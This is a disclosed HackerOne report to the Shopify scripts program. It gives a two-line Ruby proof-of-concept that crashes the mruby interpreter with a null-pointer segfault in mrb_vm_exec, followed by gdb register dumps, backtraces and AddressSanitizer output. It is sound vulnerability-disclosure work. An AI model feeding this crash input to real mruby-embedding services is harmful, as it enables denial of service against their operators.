# SIGSEGV in mrb_vm_exec

## Report Details
- **Report ID**: 217097
- **URL**: https://hackerone.com/reports/217097
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-03-29T20:41:17.885Z
- **Disclosed**: 2017-05-13T21:27:57.430Z

## Reporter
- **Username**: ston3
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
PoC
-------------------

The following code triggers the bug (attached as test_mrb_vm_exec.rb):

	def method_missing(meth,*args)yield(meth,args)end
	enum_for.next

Debug - mirb
-------------------

	x@x:~/Desktop/test/mruby/bin$ gdb -q ./mirb
	rReading symbols from ./mirb...done.
	(gdb) r test_mrb_vm_exec.rb 
	Starting program: /home/x/Desktop/test/mruby/bin/mirb test_mrb_vm_exec.rb
	mirb - Embeddable Interactive Ruby Shell

	 => :method_missing

	Program received signal SIGSEGV, Segmentation fault.
	0x0000000000407239 in mrb_vm_exec (mrb=0x6b0010, proc=0x6b5470, pc=0x0) at /home/x/Desktop/test/mruby/src/vm.c:1281
	1281	        JUMP;
	(gdb) info reg
	rax            0x0	0
	rbx            0x7213e0	7476192
	rcx            0x71b910	7452944
	rdx            0x6b73f0	7042032
	rsi            0x6b73f0	7042032
	rdi            0x6b0010	7012368
	rbp            0x7fffffffc930	0x7fffffffc930
	rsp            0x7fffffffc360	0x7fffffffc360
	r8             0x0	0
	r9             0x7ffff7acd7b8	140737348687800
	r10            0x8	8
	r11            0x7ffff7895770	140737346361200
	r12            0x401ca0	4201632
	r13            0x7fffffffdf30	140737488346928
	r14            0x0	0
	r15            0x0	0
	rip            0x407239	0x407239 <mrb_vm_exec+7691>
	eflags         0x10246	[ PF ZF IF RF ]
	cs             0x33	51
	ss             0x2b	43
	ds             0x0	0
	es             0x0	0
	fs             0x0	0
	gs             0x0	0
	(gdb) l
	1276	        }
	1277	        mrb->c->stack[0] = result;
	1278	        mrb->c->stack = ci->stackent;
	1279	        pc = ci->pc;
	1280	        cipop(mrb);
	1281	        JUMP;
	1282	      }
	1283	      else {
	1284	        /* setup environment for calling method */
	1285	        proc = mrb->c->ci->proc = m;
	(gdb) x/x $rax
	0x0:	Cannot access memory at address 0x0

Backtrace - mirb
-------------------

	(gdb) bt
	#0  0x0000000000407239 in mrb_vm_exec (mrb=0x6b0010, proc=0x6b5470, pc=0x0) at /home/x/Desktop/test/mruby/src/vm.c:1281
	#1  0x000000000040542c in mrb_vm_run (mrb=0x6b0010, proc=0x6b22f0, self=..., stack_keep=1) at /home/x/Desktop/test/mruby/src/vm.c:823
	#2  0x0000000000402b90 in main (argc=2, argv=0x7fffffffdf38) at /home/x/Desktop/test/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549
	

Clang - mirb
-------------------

	x@x:~/Desktop/test/mruby/bin$ ASAN_SYMBOLIZER_PATH=//usr/lib/llvm-3.8/bin/llvm-symbolizer ../../clang/mruby/bin/mirb test_mrb_vm_exec.rb 
	mirb - Embeddable Interactive Ruby Shell

	 => :method_missing
	ASAN:DEADLYSIGNAL
	=================================================================
	==5574==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x0000004f7921 bp 0x7fff098ef1c0 sp 0x7fff098ee430 T0)
		#0 0x4f7920 in mrb_vm_exec /home/x/Desktop/test/clang/mruby/src/vm.c:1281:9
		#1 0x4f5bae in mrb_vm_run /home/x/Desktop/test/clang/mruby/src/vm.c:823:10
		#2 0x4f3010 in main /home/x/Desktop/test/clang/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549:18
		#3 0x7fabf5c9dec4 in __libc_start_main /build/buildd/eglibc-2.19/csu/libc-start.c:287
		#4 0x41a575 in _start (/home/x/Desktop/test/clang/mruby/bin/mirb+0x41a575)

	AddressSanitizer can not provide additional info.
	SUMMARY: AddressSanitizer: SEGV /home/x/Desktop/test/clang/mruby/src/vm.c:1281:9 in mrb_vm_exec
	==5574==ABORTING

Debug - mruby
-------------------

	Desktop/test/mruby/bin$ gdb -q ./mruby
	Reading symbols from ./mruby...done.
	(gdb) r test_mrb_vm_exec.rb 
	Starting program: /home/x/Desktop/test/mruby/bin/mruby test_mrb_vm_exec.rb

	Program received signal SIGSEGV, Segmentation fault.
	0x0000000000441f92 in mrb_vm_exec (mrb=0x6af010, proc=0x6b4470, pc=0x0) at /home/x/Desktop/test/mruby/src/vm.c:1281
	1281	        JUMP;
	(gdb) info reg
	rax            0x0	0
	rbx            0x720500	7472384
	rcx            0x71aa10	7449104
	rdx            0x6b63f0	7037936
	rsi            0x6b63f0	7037936
	rdi            0x6af010	7008272
	rbp            0x7fffffffdb30	0x7fffffffdb30
	rsp            0x7fffffffd560	0x7fffffffd560
	r8             0x0	0
	r9             0x7ffff7acd7b8	140737348687800
	r10            0x8	8
	r11            0x7ffff7895770	140737346361200
	r12            0x401b20	4201248
	r13            0x7fffffffdf30	140737488346928
	r14            0x0	0
	r15            0x0	0
	rip            0x441f92	0x441f92 <mrb_vm_exec+7691>
	eflags         0x10246	[ PF ZF IF RF ]
	cs             0x33	51
	ss             0x2b	43
	ds             0x0	0
	es             0x0	0
	fs             0x0	0
	gs             0x0	0
	(gdb) l
	1276	        }
	1277	        mrb->c->stack[0] = result;
	1278	        mrb->c->stack = ci->stackent;
	1279	        pc = ci->pc;
	1280	        cipop(mrb);
	1281	        JUMP;
	1282	      }
	1283	      else {
	1284	        /* setup environment for calling method */
	1285	        proc = mrb->c->ci->proc = m;
	(gdb) x/x $rax
	0x0:	Cannot access memory at address 0x0

Backtrace - mruby
-------------------

	(gdb) bt
	#0  0x0000000000441f92 in mrb_vm_exec (mrb=0x6af010, proc=0x6b4470, pc=0x0) at /home/x/Desktop/test/mruby/src/vm.c:1281
	#1  0x0000000000440185 in mrb_vm_run (mrb=0x6af010, proc=0x6b1350, self=..., stack_keep=0) at /home/x/Desktop/test/mruby/src/vm.c:823
	#2  0x0000000000448587 in mrb_top_run (mrb=0x6af010, proc=0x6b1350, self=..., stack_keep=0) at /home/x/Desktop/test/mruby/src/vm.c:2614
	#3  0x0000000000438e8d in mrb_load_exec (mrb=0x6af010, p=0x70cfa0, c=0x70bbf0) at /home/x/Desktop/test/mruby/mrbgems/mruby-compiler/core/parse.y:5760
	#4  0x0000000000438f23 in mrb_load_file_cxt (mrb=0x6af010, f=0x70cbe0, c=0x70bbf0) at /home/x/Desktop/test/mruby/mrbgems/mruby-compiler/core/parse.y:5769
	#5  0x0000000000402415 in main (argc=2, argv=0x7fffffffdf38) at /home/x/Desktop/test/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:227
	
Clang - mruby
-------------------

	x@x:~/Desktop/test/mruby/bin$ ASAN_SYMBOLIZER_PATH=//usr/lib/llvm-3.8/bin/llvm-symbolizer ../../clang/mruby/bin/mruby test_mrb_vm_exec.rb 
	ASAN:DEADLYSIGNAL
	=================================================================
	==6041==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x00000053ccb1 bp 0x7fff86500860 sp 0x7fff864ffad0 T0)
		#0 0x53ccb0 in mrb_vm_exec /home/x/Desktop/test/clang/mruby/src/vm.c:1281:9
		#1 0x53af3e in mrb_vm_run /home/x/Desktop/test/clang/mruby/src/vm.c:823:10
		#2 0x543a03 in mrb_top_run /home/x/Desktop/test/clang/mruby/src/vm.c:2614:12
		#3 0x52cbc0 in mrb_load_exec /home/x/Desktop/test/clang/mruby/mrbgems/mruby-compiler/core/parse.y:5760:7
		#4 0x52cd92 in mrb_load_file_cxt /home/x/Desktop/test/clang/mruby/mrbgems/mruby-compiler/core/parse.y:5769:10
		#5 0x4f2b83 in main /home/x/Desktop/test/clang/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:227:11
		#6 0x7f4415861ec4 in __libc_start_main /build/buildd/eglibc-2.19/csu/libc-start.c:287
		#7 0x41a4e5 in _start (/home/x/Desktop/test/clang/mruby/bin/mruby+0x41a4e5)

	AddressSanitizer can not provide additional info.
	SUMMARY: AddressSanitizer: SEGV /home/x/Desktop/test/clang/mruby/src/vm.c:1281:9 in mrb_vm_exec
	==6041==ABORTING

System information
-------------------

	SHA hash - 051e40c0493f2de332f5439e3230c9fe6958bf1a
	Linux 14.04 x86_64
	gcc version 4.8.4
	

## Attachments
- test_mrb_vm_exec.rb
